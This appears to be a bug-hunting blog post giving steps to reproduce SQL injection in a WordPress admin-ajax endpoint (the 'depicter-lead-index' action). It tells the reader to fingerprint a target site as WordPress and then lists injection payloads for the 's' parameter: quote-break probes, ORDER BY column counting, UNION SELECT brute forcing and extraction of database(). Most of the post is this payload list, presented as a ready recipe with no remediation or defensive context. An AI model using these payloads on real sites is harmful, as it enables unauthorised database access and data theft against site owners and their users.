---
title: WordPress Ajax Admin SQL Injection
description: Steps to Reproduce a bug
date: 2025-10-21 12:00:00
categories: [Bugs, Steps to Reproduce]
tags: [wordpress,wp,sqli,sql,injection]
render_with_liquid: false
media_subpath: /images/2025-10-21-WP-Ajax-Admin-SQL-Injection
image:
  path: UNKNOWN.png
---

## Steps to Reproduce a SQL Injection but on a Wordpress Ajax Admin.

- Load Targeted Site’s URL in **CyberFox**
- Check the source page and find if there is any WordPress Link for example `wp-content` or use `wappalyzer` to confirm the website is a WordPress Site.
Add `/wp-admin/admin-ajax.php?s=10&prepage=20&page=1&orderBy=source_id&dataEnd&dataStart&order=DESC&sources&action=depicter-lead-index` at the end of the URL and you will see something like `{"hasMore":false,"page":1,"perpage":10,"totalPages":1,"totalHits":null,"hits":[],"commonFields":[]}`

### SQLi Testing

**Parameter `?s=10` is the injection point.**

- First try with a `'` single quotes.
- Then `?s=10' -- -`
- Then `?s=10%23`
- Then `?s=10\`
- Then `?s=10\’`
- Then `?s=10'\`
- Then `?s=10"`
- Try `?s=10')`
- Try `?s=10")`
- Try `?s=10))`
- Try `?s=10)))`

After try all of those if you don’t see any error then try to bind order by with the payload.
- Try `?s=10 order by 20` and decrease it.
- Try `?s=10 order by 20 --` and decrease it.
- Try `?s=10 order by 20%23` and decrease it.
- Try `?s=10' order by 20-- -` and decrease it.
- Try `?s=10\ order by 20-- -` and decrease it.
- Try `?s=10\' order by 20-- -` and decrease it.

After all of those if you don’t see any error then try union brute force.
- Try `?s=10+Union+All+Select+1,2,3,4,5,6,7,8,9..20` and decrease it.
- Try `?s=10+Union+All+Select+1,2,3,4,5,6,7,8,9..20--` and decrease it.
- Try `?s=10' Union+All+Select+1,2,3,4,5,6,7,8,9..20-- -` and decrease it.
- Try `?s=10) Union+All+Select+1,2,3,4,5,6,7,8,9..20--` and decrease it.
- Try `?s=10') Union+All+Select+1,2,3,4,5,6,7,8,9..20-- -` and decrease it.

After that see which number is reflected on the webpage for example `4` is reflected on the web page, replace the 4 with a string to confirming `"Unknown"` also you can check for `database()` .

> Complete ✅
{: .prompt-tip}